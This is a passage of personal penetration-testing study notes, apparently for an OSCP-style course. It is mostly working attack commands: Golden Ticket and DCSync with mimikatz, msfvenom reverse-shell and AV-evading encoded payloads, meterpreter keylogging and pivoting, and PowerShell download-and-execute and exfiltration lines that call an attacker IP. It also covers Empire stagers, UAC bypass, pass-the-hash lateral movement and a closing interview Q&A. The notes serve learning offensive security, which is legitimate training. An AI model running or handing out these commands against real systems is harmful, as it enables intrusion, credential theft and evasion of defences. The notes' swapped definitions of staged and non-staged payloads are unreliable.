			mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:blablabladomainsid /krbtgt:blablablakrbtgtpasswordhash /ptt
		With the Golden Ticket injected into memory, we can now launch a new command prompt with misc::cmd:
			mimikatz # misc::cmd
		And the attempt lateral movement with psexec:
			psexec.exe \\dc01 cmd.exe
		We now have an interactive shell on the domain controller and the whoami command shows that we are corp\fakeuser, a user that does not even exists in the AD domain and whoami /groups show that we are members of many powerful user groups, including the Domain Admins group, BINGO!
	Domain Controller Synchronization:
		Another way to achieve persistence in an AD domain, is to steal the password hashes for all administrative users in the domain.
		We could achieve this moving laterally from the domain controller and user mimikats to dump the hashes of all the users or steal a copy of the NTDS.dit database file (which is a copy of all the AD accounts stored on the hard drive), but these methods leave indicator of compromise and require to upload tools to the target machines.
		Another option is to abuse AD functionalities to reduce our attacker footprint. In prodction environments, there are usually more than one Domain Controller in a domain, this to provide redundancy. The Directory Replication Service, a remote protocol, uses replication to synchronize all the domain controllers in the domain.
		When a domani controller receives a request for an update, the domain controller does not verify that such request comes from another known domain controller, but it only verifies that the SID associated with the request has the correct privileges. If we attempt to issue a rougue update request to a domain controller from a user that is member of the Domain Admins, it will succeed. To request the replication we use once more mimikats:
			mimikatz # lsadump::dcsync /user:Administrator
		The output will contain the password hashes of all the users of the AD domain and we were able to achieve that without even logging onto the Domian Controller

Exploit modules:
	set payload
	check
Metasploit payloads:
	Staged payloads (i.e. shell/reverse_tcp): the payload is sent in its entirety together with the exploit code
	Non-staged payloads (i.e. shell_reverse_tcp): a staged payload is usually sent in two parts. The first part is usually a small primary payload that causes the victim machine to call back to the attacker, transfer a larger shellcode and then execute it. 
	Situations where a staged payload is preferred over a non-staged payload are for example when the vulnerability we are exploiting does not provide enough buffer space to pass the full payload in one time or to avoid anti-virus detection
Meterpreter:
	Meterpeter is a multi-function payload that can be dynamically extended at runtime
	This means that a meterpreter shell offers, on top of the features of a standard shell, functionalities such as file transfer, key logging, etc.
	meterpreter > help
	meterpreter > sysinfo
	meterpreter > getuid
	meterpreter > upload sourcepathlocal destinationpathremote
	meterpreter > download sourcepathremote destinationpathlocal
	meterpreter > pwd
	meterpreter > ls
	meterpreter > cd
	meterpreter > shell (***this is a persistent shell, we can close it and respawn a new shell with meterpeter***)
	meterpreter > execute -f notepad
	meterpreter > ps
	meterpreter > kill
	meterpreter > exit
Executable payloads:
	Metasploit payloads can be exported into files with various extensions (i.e. .asp, .vbs, .jar, .war, .dll, .exe, ...)
		msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o shell_reverse.exe
		msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_encoded.exe
	Metasploit can also inject payloads into existing executables
		msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/plink.exe -o shell_reverse_encoded_embedded.exe
	Alternatively to msfvenom, we can generate the same payload-injected executables from within metasploit, with the generate command
Metasploit Exploit Multi Handler:
	We use the multi handler with the command: msf5 > use multi/handler
	The we set all the required options:  set options
	We then run the handler with the -j flag, which sends the listener in background and does not block the metasploit console while waiting for the victim to connect: msf5 > exploit -j
	We can check the background jobs with the jobs command: msf5 > jobs
Client-side attacks:
	Metasploit supports many executable formats that are particularly useful when implementing client-side attacks, for example hta-psh, vba and vba-psh
	We can review these formats with: msf5 > msfvenom  -l formats | head -n 35
	Metasploit also contains multimple browser exploits (i.e. using vulnerabilities in flash)
Advanced features and transports:
	One of these advanced features are advanced encoders for payloads:
		msf5 > use multi/handler
		msf5 > show advanced
		msf5 > set EnableStageEncoding true
		msf5 > set StageEncoder x86/shikata_ga_nai
	Autorun: the autorun options allows metasploit to execute an action when a meterpreter connection is established, especially useful during a client-side attack. For example, we can configure the windows enum_logged_on_users module to automatically enumerate logged in users when meterpreter connects:
		msf5 > set AutoRunScript windows/gather/enum_logged_on_users
		msf5 > exploit
	We can also temporarily exit the meterpreter shell, perform other tasks within the metasploit framework and then re-entrer the meterpeter session if needed:
		meterpreter > background
		msf5 > sessions -l
		msf5 > sessions -i X
	We can use meterpreter payload transports to switch protocol after the initial compromise:
		To list available transports for the current meterpreter session: meterpreter > transport list
		We can add a new transport protocol to the current meterpreter session with: meterpreter > add -t reverse_tcp -l 10.11.0.4 -p 5555
		To change transport method to the newly created one: meterpreter > transport next
Post-Exploitation with Metasploit:
	Core post-exploitation features: 
		Screenshot command: meterpreter > screenshot
		Key logger:
			meterpreter > keyscan_start
			meterpreter > keyscan_dump
	Migrating processes: we can move the execution of meterpreter to a different process if needeed. Note that we are allowed to migrate to processes executed at integrity level or privilege equal or lower than that of the current process
		meterpreter > ps
		meterpreter > migrate blablaprocessid
	Post-exploitation modules:
		Powershell meterpreter module:
			meterpreter > load powershell
			meterpreter > help powershell
			meterpreter > powershell_execute "$PSVersionTable.PSVersion"
		Mimikatz meterpreter module:
			meterpreter > load kiwi
			meterpreter > getsyste
			meterpreter > cred_msv
	Pivoting with the metasploit framework:
		Let's leverage our existing meterpreter session to enumerate the internal network Active Directory infrastructure and pivot to other machines. 
		For example we want to scan a machine on the 192.168.1.0/24 network (the target machine is 192.168.1.110), while our meterpreter session is open on a dual-homed machine with IP addresses 10.11.0.22 and 192.168.1.111:
			msf5 > route add 192.168.1.0/24 2
			msf5 > route print
			msf5 > use auxiliary/scanner/portscan/tcp
			msf5 > set RHOSTS 192.168.1.110
			msf5 > set PORTS 445, 3389
			msf5 > run
		Since we have already reached Domain Admin access level credentialsm we can try to pivot to the machine at 192.168.1.110:
			msf5 > use exploit/windows/smb/psexec
			msf5 > show options
			msf5 > set SMBDomain corp
			msf5 > set SMBUser jeff_admin
			msf5 > set SMBPass Qwerty09!
			msf5 > set RHOSTS 192.168.1.110
			msf5 > set payload windows/meterpreter/bind_tcp
			msf5 > set RHOST 192.168.1.110
			msf5 > set LPORT 444
		It is important to note that the added route will work only for already established connections, thus the new shell on 192.168.1.110 must be a bind shell (a reverse shell payload wouldn"t work)
			msf5 > exploit
	Autoroute:
		Alternatively to manual pivoting, we can use the Autoroute post-exploitation module:
			msf5 > use multi/manage/autoroute
			msf5 > show options
			msf5 > session -l
			msf5 > set SESSION 2
		We run the module to set the new route automatically:
			msf5 > exploit
	socks4a:
		We can combine routes with the sock4a server module to configure a socks proxy to allow applications outside the metasploit framework to tunnel thru the pivot:
			msf5 > use auxiliary/server/socks4a
			msf5 > show options
			msf5 > set SRVHOST 127.0.0.1
			msf5 > exploit -j
		We now need to update pur proxychains configuration file (/etc/proxychains.conf) to take advantage of the soks proxy by adding a configuration line at the end of the conf file:
			sudo bash -c "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
		Finally, we can use proxychains to run rdestop to obtain GUI access from our kali machine to the machine in the internal network:
			sudo proxychains rdesktop 192.168.1.110
	Port forwarding:
		We can use the portfwd command from inside a meterpreter session, which will forward a specific port into the internal network:
			meterpreter > portfwd -h
			meterpreter > add -l 3389 -p 3389 -r 192.168.1.110
		Then, we point the rdesktop application to our localhost to actually connect to the machine in the internal network on 192.168.1.110:
rdesktop 127.0.0.1
Metasploit automation:
	Resource scripts:
		sudo msfconsole -r setup.rc

#### 4 - Maintaining Access & Persistence (post-exploitation)
meterpreter > run persistence -h
Listeners w/ nc or meterpreter multi/handler
Further actions:
	Elevating privileges
	Installing backdoors
	Upoading files and attack tools to the victim"s system
Pwncat: https://github.com/calebstewart/pwncat  

##### File Transfers
Dangers of transferring attack tools:
	Post-exploitation attack tools may be abused by malicious third parties
	Anti-virus software scans for pre-define file signatures on endpoint hosts and can generate huge frustration in these phase
	We should always try to use native tools on the compromise system
	We can upload our tools when we think that native tools on the victim machine are insufficient
Pure-FTPd
	Installing Pure-FTPd on the kali attacker machine: sudo apt-get update && sudo apt-get install pure-ftpd
	Create the relevant group and user, configure folder permission and start the FTP server with the custom script: setup-ftp.sh
Interactive vs non-interactive shells:
	Non-interactive shells (like for example nc bind and reverse shells) can be a problem when using services such as FTP, when the standard output of the service we interact with is not properly forwarded to the attacked by the shell and controll of the shell is lost.
	We need to upgrade a non-interactive shell to a fully interactive shell with the python pty shell: python -c 'import pty; pty.spawn("/bin/bash")'
Transferring files with UNIX-like environments:
	nc
	curl
	wget
Transferring files with Windows hosts:
	Non-interactive FTP download: Windows ships with a default FTP client that can be used for file trasfers. To do this, we can instruct this Windows FTP client to download from our attacker Pure-FTPd server a simple text file containing all the FTP commands to execute sequentially to connect, download the intended file and close the connection
Windows downloads using scripting languages VBScript and PowerShell:
	cscript wget.vbs http://10.11.0.4/wget.exe evil.exe
	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
	or as a 1-liner: powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe', 'evil3.exe') or as variant WITHOUT writing anything to disk on the victim machine: 
		On the attacker machine we save the simple PowerShell script helloworld,ps1 (with content: Write-Output "Hello World")
		On the victim machine: powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
Windows downloads with exe2hex and PowerShell:
	On the attacker machine, we will compress our binary, convert it to HEX and create a Windows script. 
	On the Windows victim machine, we will paste the script into a shell and run it. It will redirect the HEX data into powershell.exe, which will asseble it back into a binary. This will be done thru a series of non-interactive commands:
		upx -9 nc.exe
		exe2hex -x nc.exe -p nc.cmd
		cat nc.cmd | xclip -selection clipboard
		now we paste the script into our bind shell
		at the end of the paste process, we will have reconstructed nc.exe on the victim"s machine
Windows upload with Windows scripting languages (data exfiltration from our victim to our attacker machines):
	We need to have a upload PHP script available in the Web root of the attacker machine: upload.php
	create the uploads folder: sudo mkdir /var/www/uploads
	assign proper priviledges (to note that this will allow anyone to upload a file to our attacker machine): sudo chown www-data: /var/www/uploads 
	and finally we exfiltrate the evil.exe from the victim to the attacke: powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'evil.exe')
Uploading files with TFTP client:
	This can be used on older Windows systems, up to Windows XP and Windows 2003 (the TFTP client is not installed on Windows 7, Windows 2008 and newer)
	We need to install TFTP on our attacker machine: sudo apt-get install atftp
	Then, to create the transfer folder, configure it and launch it with the following commands: sudo mkdir /tftp && sudo chown nobody: /tftp && sudo atftpd --daemon --port 69 /tftp
	Finally, on our Windows victim machine, we cna exfiltrate the evil2.exe file with the command: tftp -i 10.11.0.4 put evil2.exe

##### Antivirus Evasion
virustotal.com allows us to run a virus scan on any executable and shows the detection rate of various anti virus products
Anti virus detection methods:
	Signature-based detection: this is a black list technology. We can bypass signature-based detection by obfuscating the content of a file 
	Huristic-based detection: it relies on rules and algorithms based on the analisys of the instruction set of a binary file or its decompilation and analisys of derived source code
	Behavioural-based detection: based on the dynamic analisys of the binary file behaviour, often executed on a sandbox environment
Most antivirus products offer a combination of these three capabilities to achieve beffere detection rate
Antivirus evasion:
	On disk evasion: it focuses on modifying malicious files physically stored on disk in order to avoid detection. There are 4  main techniques to obfuscate files stored on a physical disk: 
		Packers: it generates a functionally equivalent binary with a completely new binary structure, thus with a new signature to bypass AV scanners
		Ofuscators: they reorganize and mutate code in a way that it makes more difficult to reverse engineer it. This includes replacing instructions with semantically equivalent ones, inserting irrelevant instructions (dead code), re-order functions and so on
		Crypters (crypter software): they crytographycally alter eecutable code, adding a decrypting stub that restores the original code upon execution. This decryption happens in memory, leaving on disk only encrypted code and thus evading AV detection
		Software protectors: originally used for legitimate purposes, can also be used to bypass AV detection
	In memory evasion: modern malware often attempts in memory operations, to avoid touching the disk entirely. This technique (in memory injection or PE injection) focuses on the manipulation of volatile memory and does not write any file to disk, which is one of the area of most focus for many antivirus products
		Remote Process Memory Injection: it attempts to inject the payload in the memory of another valid program that is not malicious, The most common way to do this is to leverage a set of Windows APIs to execute the malicious code in a separate thread using the CreateRemoteThread API
		Reflective DLL Injection: it attempts to load a DLL stored by the attacker in the process memory. Unlike regular DLL injection (loading a DLL from disk with the LoadLibrary API), loading a DLL from process memory is not supported by any Windows API and the attackers must write their own API to do that 
		Process Hollowing: attackers first launch a non malicious process in a suspended state. Once launched, the image of this process is removed from memory and replaced with a malicious executable image. Then execution is resumed and malicious code is executed instead of the legitimate process
		Inline hooking: it involves modifying memory and introducing a hook (an instruction that redirects code execution into a function to point the execution flow to our malicious code). Upon executing of the malicious code, the flow will return back to the modified function and resume execution, appearing like only the legitimate code has been executed
Generally speaking, it is very difficult to find an universal solution to bypass AV detection. What is instead doable, is to target a specific AV product/version and focus on avoiding detection for a very specific situation/configuration
PowerShell in-memory Injection:
	A very powerful feature of PowerShell is its ability to interact with Windows APIs. This allows us to implement the in-memory injection process in a PowerShell script. It is much more difficult for AV software to flag a script as malicious, rather then a PE (portable executable), since the script is not compiled, but interpreted and can be changed on the fly at any point in time
Shellter:
	Shellter is a dynamic shellcode injection tool to inject shellcode into legitimate PEs memory space to avoid AV detection. Shellter attempts to use the existing PE"s importAddress table entries to locate functions that will be used fo the memory allocation, transfer and execution of our payload
	In case we have selected a Meterpreter_Reverse_TCP payload to be injected in a PE with Shellter and configured a listener on the attacker machine (i.e.: msfconsole -x "use exploit/multi/handler; set RHOST 10.11.0.22; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.11.0.4; exploit"), it is crucial to setup an autorun script to migrate our Meterpreter shell to a separate process immediately after session creation in case the injected PE execution completes quickly. We can setup the autorun script as follows from within msfconsole: set AutoRunScript post/windows/manage/migrate

##### Privilege Escalation Concepts
Direct-to-root compromises are rare in modern environments
There are some common vectors to privilege escalation:
	Misconfigured services
	Insufficient file permissions
	Kernel vulnerabilities
	Vulnerable software running with high privileges
Information gathering:
	Manual enumeration:
		Enumerating users (potential targets for escalation of privileges): 
			Linux: whoami, id, /etc/passwd
			Windows: whoami, net user username, net user
		Enumerating the hostname (can give clues about the function of themachine/server):
			Linux: hostname
			Windows: hostname
		Enumerating the operating system version and architecture:
			Linux: /etc/issue, /etc/*-release, uname -a
			Windows: systeminfo
		Enumerating running processes and sevices:
			Linux: ps aux
			Windows: tasklist /SVC
		Enumerating networking information:
			Linux: ifconfig a, ip a, cat /sbin/route, netstat -anp, ss -anp
			Windows: ipconfig /all, route print, netstat -ano
		Enumerating firewall status and rules:
			Linux: grep -Hs iptables /etc/*
			Windows: netsh advfirewall show currentprofile, netsh advfirewall show rule name=all
		Enumerating scheduled tasks:
			Linux: ls -lah /etc/cron*
			Windows: schtasks /quey /fo LIST /v
		Enumerating installed applications and patch levels:
			Linux: dpkg -l
			Windows: wmic product get name, version, vendor, wmic qfe get Caption, Description, HotFixID, InstalledOn
		Enumerating readable/writable directories and files:
			Linux: to list all the directories writable by yhe current user: find / -writable -type 2>/dev/null
			Windows: 
				We can use and external tool uploaded to the victim machine: c:\Tools\privilege_escalation\SysinternalsSuite\accesschk.exe -uws "Everyone" "C:\Program Files"
				Or we can use PowerShell if transferring tool from the attacker is not possible: Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?($_.AccessToString -match "Everyone\sAllow\s\Smodify")
		Enumerating unmounted disks:
			Linux: mount, cat /etc/fstab, /bin/lsblk
			Windows: mountvol
		Enumerating device drivers and lernel modules:
			Linux: lsmod, /sbin/modinfo blabla
			Windows:
				From within PowerShell: driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
				To get the version of the drivers/kernel modules: Get-WmiObject Win32_PnPSignefDriver | Select-Object DeviceName, DriverVersion, manufactrer | Where-Objet {$_.DeviceName -like "*VMware*"}
		Enumerating binaries that autoelevate:
			Linux: we can search for suid files. If a binary is owned by root and the suid bit is set, anybody can execute that binary as root:
				find / -perm -u=s -type f 2>/dev/null
			Windows: if these values are "1", then any user can run Windows installer packages with elevated privileges and we can craft a msi file to elevate our privileges:
				reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
				reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
	Automated enumeration:
		Linux: ./unix-privesccheck standard > output.check
		Windows: c:\Tools\privilege_escalation\windows-privesc-checkmaster\windows-privesc-check2.exe -h

##### PowerShell Empire
PowerShell Empire is a PowerShell and Python exploitation and post-exploitation agent with focus on client-side exploitation and post-exploitation for Active Directory deployments
Exploitation and post-exploitation are performed using PowerShell on Windows and Python on Linux and MacOS
Empire relies on pre-installed libraries and features and requires PowerShell v2 on Windows and Python v2.6 or 2.7 on Linux and MacOS
Empire is not installed by default and needs to be installed manually:
	sudo apt install powershell-empire  
	powershell-empire
PowerShell Empire syntax:
	(Empire) > help
Listeners and Stagers:
	Listeners accept inbound connections from various Empire agents
	Stagers are small pieces of code generated by Empire that are executed on the victim and connect back to a listener, facilitating the transfer to the victim of a staged payload
	To begin an Empire session, we will first enter the listener context: (Empire) > listeners
	Then we print the available listeners: (Empire: listeners) > uselistener [TAB] [TAB] 
	Once we have decided on which listener to use (for example the http listener), we select it: (Empire: listeners) > uselistener http
	We then run the info command to shop the listener information and syntax: (Empire: listeners/http) > info 
	Important listener options to set:
		Host
		Port
		DefaultDelay
		DefaultJitter
		KillDate
	Example of setting an option: 
		(Empire: listeners/http) > set Host 10.11.0.4
	Once the options are set, we can start the listener with the execute command: 
		(Empire: listeners/http) > execute
	We can go back to the main menu with the command back: 
		(Empire: listeners/http) > back
	We can then list all available stagers with the command: 
		(Empire: listeners) > usestager [TAB] [TAB]
	To select the desired stager: 
		(Empire: listeners) > usestager windows/launcher_bat
	We can review the stager options with the info command: 
		(Empire: stager/windows/launcher_bat) > info
	Important stager options to set:
		Listener
	We can set the listener for our stager with the set command: 
		(Empire: stager/windows/launcher_bat) > set Listener http
	Finally, we create the stager with the execute command: 
		(Empire: stager/windows/launcher_bat) > execute
	We can have a look at the generated stager opening the file /tmp/launcher.bat:
		less /tmp/launcher.bat
	The stager is a base64 encoded PowerShell command string. The first stage payload will connect to the listener and fetch the rest of the Empire Agent code
The Empire Agent:
	With the listener running and the stager prepared, we now need to deploy the agent on the victim. The agent is the final payload retrieved by the stager and will alows us to execute commands and interact with the victim system
	The stager deletes itself and exits once it finishes execution
	Once the agent is operational on the target, it will established an AES ecrypted communication channel with the listener, using the data portion of the HTTP GET and POST requests
	To deploy our agent we need to copy the launche.bat file to the target Windows system and execute from a command prompt
	Once the agent is executed, we go back to the Empire console on our attacker machine and we see that Empire has received the agent call.
	We can display all active agents with the agents command:
		(Empire: stager/windows/launcher_bat) > agents
	Now we can interact with the desired agent using the interact command and the agent name (63WFMDBUS in the case of our example):
		(Empire: stager/windows/launcher_bat) > interact 63WFMDBUS
	Let"s use the agent to run sysinfo on the victim:
		(Empire: 63WFMDBUS) > sysinfo
	From within the agent, the help command shows all available commands:
		(Empire: 63WFMDBUS) > help
	Useful commands are:
		upload
		download
		exit
		shell (to open a command prompt)
		spawn (to create an additional agent on the same host)
	Like metasploit, Empire allows us to migrate the payload to a different process
	We first list all running processes with ps
		(Empire: 63WFMDBUS) > ps
	Once we have chosen our target process, we can inject the payload with the psinject command, and the name of the listener and the target process id as command arguments:
		(Empire: 63WFMDBUS) > psinject http 252
	Unlike th emigration feature in metasploit with meterpreter, once the migration process is completed, the original Empire agent remains active and we need to manually switch to the newly created one (with name WTUE31AV):
		(Empire: 63WFMDBUS) > agents
		(Empire: agents) > interact WTUE31AV
		(Empire: WTUE31AV) >
PowerShell Modules:
	The power of PowerShell and Empire comes from the many modules available. To list all the available modules we can use the usemodule command:
		(Empire: WTUE31AV) > usemodule [TAB] [TAB]
Situational Awareness:
	Let us investigate the get-user module:
		(Empire: WTUE31AV) > usemodule situational_awareness/network/powerview/get_user
	We can explore the options of the module with the info command:
		(Empire: powershell/situational_awareness/network/powerview/get_user) > info
	Important module options are:
		Name
		Module
		Language
		NeedsAdmin (set to true if module needs local admin privileges)
		OpsecSafe (set to true if we wish to avoid to leave behind proofs of compromise to evade endpoint protections machenisms)
		MinLanguageVersion (minimum version of PowerShell required to execute the script)
	Finally, we will run the module with the execute command:
		(Empire: powershell/situational_awareness/network/powerview/get_user) > execute
	To be noted that the situational_awareness category also includes a wide variety of network and port scanners
Credentials and privilege escalation:
	One of the most interesting modules in this group for privilege escalation is the "powerup allchecks" module
		(Empire: powershell/situational_awareness/network/powerview/get_user) > usemodule powershell/privesc/powerup
		(Empire: powershell/privesc/powerup/allchecks) > execute
	Another useful module is the bypassuac_fodhelper module, especially hany if we have a local admin access level. Depending on the Windows version, this module can bypass UAC and launch a high integrity PowerShell Empire agent:
		(Empire: powershell/privesc/powerup/allchecks) > usemodule powershell/privesc/bypassuac_fodhelper
	Before launching this module, we need to configure our listener:
		(Empire: powershell/privesc/bypassuac_fodhelper) > info
		(Empire: powershell/privesc/bypassuac_fodhelper) > set Listener http
		(Empire: powershell/privesc/bypassuac_fodhelper) > execute
	Once we have obtained Local Admin privileges on the Windows victim, we can then execute commands that require that integrity leve, such as Mimikatz to dump password hashes. The credentials category contains multiple Mimikatz commands that have been imported into Empire. The following command shows all available credentials modules:
		(Empire: 78PSBD4H) > usemodule credentials/ [TAB] [TAB]
	To be noted that if an "*" is printed aside to a module"s name, that module requires Local Admin integrity level. Let"'s have a closer look at a high integrity module, such as mimikatz/logonpasswords:
		(Empire: 78PSBD4H) > usemodule powershell/credentials/mimikatz/logonpasswords
		(Empire: powershell/credentials/mimikatz/logonpasswords) > execute
	The credentials found by that module are not only printed to screen as output of the command, but also stored in the Empire credentials store, enumerated with the creds command:
		(Empire: powershell/credentials/mimikatz/logonpasswords) > creds
Lateral movement:
	Let's attempt to perform lateral movement and reach the domain controller, that is located on a network that is not directly reachable from our attacker kali machine
	To list all available lateral movement modules:
		(Empire: powershell/credentials/mimikatz/logonpasswords) > usemodule powershell/lateral_movement/ [TAB] [TAB]
	As an example, we will use the invoke_smbexec module:
		(Empire: powershell/credentials/mimikatz/logonpasswords) > usemodule powershell/lateral_movement/invoke_smbexec
		(Empire: powershell/lateral_movement/invoke_smbexec) > info
		(Empire: powershell/lateral_movement/invoke_smbexec) > set ComputerName win10-x86
		(Empire: powershell/lateral_movement/invoke_smbexec) > set Listener http
		(Empire: powershell/lateral_movement/invoke_smbexec) > set Hash blablablajeff_adminpasswordhash
		(Empire: powershell/lateral_movement/invoke_smbexec) > set Domain corp.com
		(Empire: powershell/lateral_movement/invoke_smbexec) > execute
	BINGO! The agent was successfully deployed and we can now interact with it:
		(Empire: powershell/lateral_movement/invoke_smbexec) > agents
		(Empire: agents) > interact 4D9FH8GA
		(Empire: 4D9FH8GA) > 
Switching between Empire and Metasploit
	A possible integration of Metasploit and Empire can be showcased as follows:
		We use msfvenom to craft a malicious PW with a reverse meterpreter shell in it
		We setup a local meterpreter listener on localhost with Metasploit
		We then use Empire to upload the malicious PE to the Windows victim
		Finally we use Empire to execute the malicious file on the Windows victim with the Empire shell command
		And we then verify that a meterpreter session was opened on our attacker kali machine 
	Connecting to an Empire agent from an existing meterpeter sesison is also simple:
		We first create a launcher with Empire 
		We also set the listener in Empire
		Then we use the existing meterpeter session to upload and execute it with the upload and shell commands rispectively
		Once we have executed the launcher.bat, we will receive an agent call on our Empire listener

### Pen-test Interview Questions
Q: Tell me a little bit about youself...
A: ... 

Q: Do you have any hobbies outside of work?
A: Pen-testing is obviously one of my hobbies, it must be to be in the industry but, besides that, triathlon, etc.

Q: When it comes to pentesting, what is the aspect, phase, type of engagement that you enjoy the most?
A: ...

Q: Do you have a least favorite part?
A: ...

Q: Where do you get your news and stay up to date on exploits, vulnerabilities, etc.?
A: Twitter and pretty much any social media out there, Microsoft Security Response Center, ExploitDB, Common Vulnerabilities and Exposures (CVE®) List  

Q: What is your biggest weakness in pentesting?
A: ...

Q: Let"s dive in a scenario-based kind of question: starting from the external component of the pentest, which is your usual methodology?
A: First off, establish perfect communication with the customer and setup a kick-off meeting to define the scope of the pentest, objectives, limitations and what is allowed and what is not (rules of engagement). Then, I start with reconnaissance and enumeration of IP addresses and domains. Yhen I start looking for low hanging fruits, like defautl credentials and password spraying and credential stuffing on login forms

Q: How can we confirm a blind SQL injection?
A: With time-based injection like sleep(5), sleep(10), etc.

Q: Which are the types of SQLi?
A: In-band SQLi (Classic SQLi): Error-based SQLi and Union-based SQLi. Inferential SQLi (Blind SQLi): Boolean-based (content-based) Blind SQLi or Time-based Blind SQLi

Q: Which are the types of XXS?
A: Reflected XSS, stored/persistent XSS and DOM-based XSS

Q: How would you recommend the customer to mitigate SQL injection?
A: Input validation and parameterized queries

Q: Now, let's assume you got in the internal network via that SQL injection, how do you approach the internal portion of the pentest?
A: For example on Windows networks, run Responder, Mitm6, SMB Signing (you don't need to be authenticated), BloodHound, metasploit, check for EternalBlue, SharkShell, ms08-067/Conficker, Kerberoasting (which requires an account on the network), etc. Also, see if the noise generated by the internal pentest is picked up by the security team and SIMs (as it should)

Q: Once you get some valid credentials, how do you try to use these credentials onto the rest of the network? 
A: With Impacket toolkit, CrackMapExec, etc.

Q: Assume you get local admin on the internal network, what would you do next to penetrate further?
A: Look for GPP passwords, which are cryptographically weak, or use impersonate user tokens with Incognito, use mimikatz, hashdump, move laterally to other machines/networks, etc.

Q: What about your approach to persistence?
A: Implement persistence via a scheduled task, registry entry, etc.

Q: Assume now that you achieved admin on a child domain controller, how would you leverage these credentials for persistence and then how would you go after the parent domain controller?
A: I would create a Kerberos Golden Ticket or a Kerberos Silver Ticket to be more stealthy (this deas not manipulate the Kerberos TGT). As far as peristence if you have the password hash of the KRBTGT service, you can persist in the domain as long as the target company exists (the KRBTGT needs to be changed twice in order to lose persistence).

Q: That's all for the scenario based questions. One last question on wireless pentesting: what's the difference between WPA2 Personal and WPA2 Enterprise and how would you go after those?
A: Both use a strong encryption method called AES-CCMP to encrypt data transmitted over the air. The main difference between these security modes is in the authentication stage: WPA2 Enterprise uses IEEE 802.1X, which offers enterprise-grade authentication, while WPA2 Personal uses pre-shared keys (PSK). To crack WPA2 Personal (same same for WPA), you can capture the four way handshake, during which the AP and the client use a nonce and the pre-shared key (PSK) to generate the pairwise transient key (PTK). Then use a list of possible plain text passwords or a pre-computed table of hashed passwords (Rainbow Tables) to indentify the PSK. Some of the available tools to attack WPA2 Personal are Aircrack-ng, FreeRADIUS and asleap.Attacking WPA2 Enterprise is more complex: the attack consists of spoofing the target network and provide a better signal to the client than legitimate access point, in order to perform a mitm attack between clients and network infrastructure, because currently the TLS tunnel is enough secure and not easily attackable. To make this type of attack you need to be physically proximity to the target, especially staying within the action range of enterprise access point. Some of the available tools to setup such attack are Aircrack-ng, FreeRADIUS and asleap.

Q: Very last question on AD internal pentesting: can you mention few possible attacks/scenarions when dealing with AD environments?
A: Generally speaking, these are the most common attacks/scenarios available in a AD environment: LLMNR/NBT-NS poisoning attacks, SMB relay attacks, IPv6 DNS takeover attacks, Pass-the-password/pass-the-hash, token impersonation, Kerberoasting, Golden Ticket, PowerView/BloodHound enumeration tools, credential dumping with Mimikatz
